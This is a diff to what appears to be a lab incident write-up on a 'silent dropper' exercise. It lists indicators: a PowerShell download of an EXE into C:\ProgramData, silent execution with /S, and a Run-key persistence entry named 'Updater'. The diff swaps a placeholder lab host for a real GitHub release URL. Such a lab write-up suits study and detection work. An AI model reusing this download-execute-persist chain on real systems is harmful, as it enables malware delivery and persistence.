@@ -109,7 +109,8 @@ try {
 - **File Path:** `C:\ProgramData\7z2408-x64.exe`
 - **Registry Key:** `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater`
 - **Process CommandLines:**
-  - `powershell.exe Invoke-WebRequest -Uri https://<labhost>/7z2408-x64.exe -OutFile C:\ProgramData\7z2408-x64.exe`
+  - `$uri = "https://github.com/charliecash310/silent-dropper-lab/releases/download/v1.0/7z2501-x64.exe"`
+  - `$out = "C:\ProgramData\7z2408-x64.exe"`
   - `C:\ProgramData\7z2408-x64.exe /S`
 - **Network Indicators:**
   - Remote URL: `https://<labhost>/7z2408-x64.exe`
@@ -121,7 +122,7 @@ try {
 | Time (UTC) | Evidence Type | Details |
 |------------|---------------|---------|
 | T0         | Process       | PowerShell executed with download command |
-| T0+1m      | Network       | HTTP GET to `<labhost>/7z2408-x64.exe` |
+| T0+1m      | Network       | HTTP GET to `"https://github.com/charliecash310/silent-dropper-lab/releases/download/v1.0/7z2501-x64.exe"` |
 | T0+2m      | File          | File created in `C:\ProgramData` |
 | T0+3m      | Process       | Silent execution of downloaded EXE |
 | T0+4m      | Registry      | Run key persistence created |
